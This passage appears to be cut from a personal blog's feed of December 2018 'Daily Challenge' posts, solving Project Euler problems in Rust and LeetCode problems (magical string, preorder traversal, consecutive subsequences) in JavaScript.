class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">481. Magical String</span><br><span class="line"></span><br><span class="line">A magical string S consists of only &apos;1&apos; and &apos;2&apos; and obeys the following rules:</span><br><span class="line"></span><br><span class="line">The string S is magical because concatenating the number of contiguous occurrences of characters &apos;1&apos; and &apos;2&apos; generates the string S itself.</span><br><span class="line"></span><br><span class="line">The first few elements of string S is the following: S = &quot;1221121221221121122……&quot;</span><br><span class="line"></span><br><span class="line">If we group the consecutive &apos;1&apos;s and &apos;2&apos;s in S, it will be:</span><br><span class="line"></span><br><span class="line">1 22 11 2 1 22 1 22 11 2 11 22 ......</span><br><span class="line"></span><br><span class="line">and the occurrences of &apos;1&apos;s or &apos;2&apos;s in each group are:</span><br><span class="line"></span><br><span class="line">1 22 1 1 2 1 2 2 1 2 2 ......</span><br><span class="line"></span><br><span class="line">You can see that the occurrence sequence above is the S itself.</span><br><span class="line"></span><br><span class="line">Given an integer N as input, return the number of &apos;1&apos;s in the first N number in the magical string S.</span><br><span class="line"></span><br><span class="line">Note: N will not exceed 100,000.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line">Input: 6</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: The first 6 elements of magical string S is &quot;12211&quot; and it contains three 1&apos;s, so return 3.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Check <a href="https://en.wikipedia.org/wiki/Kolakoski_sequence" target="_blank" rel="noopener">Kolakoski sequence - Wikipedia</a>.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> magicalString = <span class="function">(<span class="params">n</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">let</span> index = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(arr.length &lt; n)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[index] === <span class="number">2</span>) arr.push(cur);</span><br><span class="line">    arr.push(cur);</span><br><span class="line">    cur ^= <span class="number">3</span>;</span><br><span class="line">    ++index;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i] === <span class="number">1</span>) ++ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Quicker but uglier</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> magicalString = <span class="function">(<span class="params">n</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(n+<span class="number">3</span>);</span><br><span class="line">  arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  arr[<span class="number">1</span>] = arr[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">let</span> head = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">let</span> index = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(head &lt; n)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[index] === <span class="number">2</span>)&#123;</span><br><span class="line">      arr[head] = cur;</span><br><span class="line">      ++head;</span><br><span class="line">    &#125; </span><br><span class="line">    arr[head] = cur;</span><br><span class="line">    ++head;</span><br><span class="line">    cur ^= <span class="number">3</span>;</span><br><span class="line">    ++index;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i] === <span class="number">1</span>) ++ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-27 Daily Challenge</title>
      <link href="/2018-12-27-Daily-Challenge/"/>
      <url>/2018-12-27-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>10001st prime</em> in <em>Rust</em> and <em>Binary Tree Preorder Traversal</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">10001st prime</span><br><span class="line"></span><br><span class="line">Problem 7 </span><br><span class="line"></span><br><span class="line">By listing the first six prime numbers: 2, 3, 5, 7, 11, and 13, we can see that the 6th prime is 13.</span><br><span class="line"></span><br><span class="line">What is the 10 001st prime number?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>It&#39;s easy to think about use sieve of Eratosthenes to compute prime, whose time complexity is $O(nloglogn)$, or Euler sieve, whose time complexity is $O(n)$.</p><p>I&#39;ll do it with extern crate. ;)</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> p = primal::Primes::all().nth(<span class="number">10001</span> - <span class="number">1</span>).unwrap();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"The 10001st prime is &#123;&#125;"</span>, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">144. Binary Tree Preorder Traversal</span><br><span class="line"></span><br><span class="line">Given a binary tree, return the preorder traversal of its nodes&apos; values.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,2,3]</span><br><span class="line">Follow up: Recursive solution is trivial, could you do it iteratively?</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>;p</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> preorderTraversal = <span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> [];</span><br><span class="line">  <span class="keyword">let</span> ans = [root.val]</span><br><span class="line">  ans = ans.concat(preorderTraversal(root.left));</span><br><span class="line">  ans = ans.concat(preorderTraversal(root.right));</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> preorderTraversal = <span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> [];</span><br><span class="line">  <span class="keyword">let</span> ans = [root.val];</span><br><span class="line">  <span class="keyword">let</span> s = [];</span><br><span class="line">  s.push(root.right);</span><br><span class="line">  s.push(root.left);</span><br><span class="line">  <span class="keyword">while</span>(s.length)&#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = s.pop();</span><br><span class="line">    <span class="keyword">if</span>(tmp === <span class="literal">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">    ans.push(tmp.val);</span><br><span class="line">    s.push(tmp.right);</span><br><span class="line">    s.push(tmp.left);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2018-12-27-Daily-Challenge/1545880199212.png" title="wwwww">]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-26 Daily Challenge</title>
      <link href="/2018-12-26-Daily-Challenge/"/>
      <url>/2018-12-26-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Sum square difference</em> in <em>Rust</em> and <em>Split Array into Consecutive Subsequences</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Sum square difference</span><br><span class="line"></span><br><span class="line">Problem 6 </span><br><span class="line"></span><br><span class="line">The sum of the squares of the first ten natural numbers is,</span><br><span class="line"></span><br><span class="line">1^2 + 2^2 + ... + 10^2 = 385</span><br><span class="line">The square of the sum of the first ten natural numbers is,</span><br><span class="line"></span><br><span class="line">(1 + 2 + ... + 10)^2 = 55^2 = 3025</span><br><span class="line">Hence the difference between the sum of the squares of the first ten natural numbers and the square of the sum is 3025 − 385 = 2640.</span><br><span class="line"></span><br><span class="line">Find the difference between the sum of the squares of the first one hundred natural numbers and the square of the sum.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute force is enough for such a small range.</p><p>But if I want to solve it more elegantly, there is one formula show up during my high school life.</p><p>$1^2+2^2+3^2+...+n^2=\frac{n(n+1)(2n+1)}{6}$</p><p>So the answer will be $\frac{n^4}{4}+\frac{n^3}{6}-\frac{n^2}{4}-\frac{n}{6}$</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, solve_brute(<span class="number">100</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, solve_formula(<span class="number">100</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">solve_brute</span></span>(n: <span class="built_in">i32</span>) -&gt; <span class="built_in">i64</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> ans: <span class="built_in">i64</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp: <span class="built_in">i64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..n+<span class="number">1</span> &#123;</span><br><span class="line">        tmp += i <span class="keyword">as</span> <span class="built_in">i64</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ans = tmp * tmp;</span><br><span class="line">    tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..n+<span class="number">1</span> &#123;</span><br><span class="line">        tmp += (i * i) <span class="keyword">as</span> <span class="built_in">i64</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ans - tmp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">solve_formula</span></span>(n: <span class="built_in">i32</span>) -&gt; <span class="built_in">i64</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp: <span class="built_in">f64</span> = n <span class="keyword">as</span> <span class="built_in">f64</span>;</span><br><span class="line">    (tmp.powf(<span class="number">4.0</span>)/<span class="number">4.0</span> + tmp.powf(<span class="number">3.0</span>)/<span class="number">6.0</span> - tmp.powf(<span class="number">2.0</span>) / <span class="number">4.0</span> - tmp/<span class="number">6.0</span>) <span class="keyword">as</span> <span class="built_in">i64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">659. Split Array into Consecutive Subsequences</span><br><span class="line"></span><br><span class="line">You are given an integer array sorted in ascending order (may contain duplicates), you need to split them into several subsequences, where each subsequences consist of at least 3 consecutive integers. Return whether you can make such a split.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line">Input: [1,2,3,3,4,5]</span><br><span class="line">Output: True</span><br><span class="line">Explanation:</span><br><span class="line">You can split them into two consecutive subsequences : </span><br><span class="line">1, 2, 3</span><br><span class="line">3, 4, 5</span><br><span class="line">Example 2:</span><br><span class="line">Input: [1,2,3,3,4,4,5,5]</span><br><span class="line">Output: True</span><br><span class="line">Explanation:</span><br><span class="line">You can split them into two consecutive subsequences : </span><br><span class="line">1, 2, 3, 4, 5</span><br><span class="line">3, 4, 5</span><br><span class="line">Example 3:</span><br><span class="line">Input: [1,2,3,4,4,5]</span><br><span class="line">Output: False</span><br><span class="line">Note:</span><br><span class="line">The length of the input is in range of [1, 10000]</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Call a <em>chain</em> a sequence of 3 or more consecutive numbers.</p><p>Considering numbers <code>x</code> from left to right, if <code>x</code> can be added to a current chain, it&#39;s at least as good to add <code>x</code> to that chain first, rather than to start a new chain.</p><p>So we just need to see if current x can be add to a chain or can be first of a new chain.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> isPossible = <span class="function">(<span class="params">nums</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">let</span> need = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> i <span class="keyword">of</span> nums)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!map.has(i)) map.set(i, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> map.set(i, map.get(i)+<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// console.log(map);</span></span><br><span class="line">  <span class="comment">// console.log(need);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> i <span class="keyword">of</span> nums)&#123;</span><br><span class="line">    <span class="keyword">if</span>(map.get(i) == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(need.has(i)&amp;&amp;need.get(i) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      need.set(i, need.get(i)<span class="number">-1</span>);</span><br><span class="line">      need.set(i+<span class="number">1</span>, need.has(i+<span class="number">1</span>)?need.get(i+<span class="number">1</span>)+<span class="number">1</span>:<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(map.has(i+<span class="number">1</span>)&amp;&amp;map.get(i+<span class="number">1</span>)&gt;<span class="number">0</span>&amp;&amp;map.has(i+<span class="number">2</span>)&amp;&amp;map.get(i+<span class="number">2</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      map.set(i+<span class="number">1</span>, map.get(i+<span class="number">1</span>)<span class="number">-1</span>);</span><br><span class="line">      map.set(i+<span class="number">2</span>, map.get(i+<span class="number">2</span>)<span class="number">-1</span>);</span><br><span class="line">      need.set(i+<span class="number">3</span>, need.has(i+<span class="number">3</span>)?need.get(i+<span class="number">3</span>)+<span class="number">1</span>:<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    map.set(i, map.get(i)<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(isPossible([1,2,3,3,4,5]));</span></span><br><span class="line"><span class="comment">// console.log(isPossible([1,2,3,3,4,4,5,5]));</span></span><br><span class="line"><span class="comment">// console.log(isPossible([1,2,3,4,4,5]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-25 Daily Challenge</title>
      <link href="/2018-12-25-Daily-Challenge/"/>
      <url>/2018-12-25-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Smallest multiple</em> in <em>Rust</em> and <em>Remove Duplicates from Sorted Array</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Smallest multiple</span><br><span class="line"></span><br><span class="line">Problem 5 </span><br><span class="line"></span><br><span class="line">2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder.</span><br><span class="line"></span><br><span class="line">What is the smallest positive number that is evenly divisible by all of the numbers from 1 to 20?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>On the one hand I can compute the LCM with Euclidean Algorithm, one the other hand I can compute the contribution of each prime, and then, get the right answer.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Primes;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = lcm(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">3</span>..<span class="number">21</span> &#123;</span><br><span class="line">        ans = lcm(ans, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">    </span><br><span class="line">    ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> twenty: <span class="built_in">f64</span> = <span class="number">20f64</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp: <span class="built_in">u64</span>;</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> Primes::all().take(<span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">19</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> q = twenty.log(p <span class="keyword">as</span> <span class="built_in">f64</span>) <span class="keyword">as</span> <span class="built_in">u32</span>;</span><br><span class="line">        tmp = p <span class="keyword">as</span> <span class="built_in">u64</span>;</span><br><span class="line">        ans *= tmp.pow(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">lcm</span></span>(a: <span class="built_in">u64</span>, b: <span class="built_in">u64</span>) -&gt; <span class="built_in">u64</span> &#123;</span><br><span class="line">    a/ gcd(a, b) * b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">gcd</span></span>(<span class="keyword">mut</span> a: <span class="built_in">u64</span>, <span class="keyword">mut</span> b: <span class="built_in">u64</span>) -&gt; <span class="built_in">u64</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp: <span class="built_in">u64</span>;</span><br><span class="line">    <span class="keyword">while</span> b!= <span class="number">0</span> &#123;</span><br><span class="line">        tmp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = tmp % b;</span><br><span class="line">    &#125;</span><br><span class="line">    a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 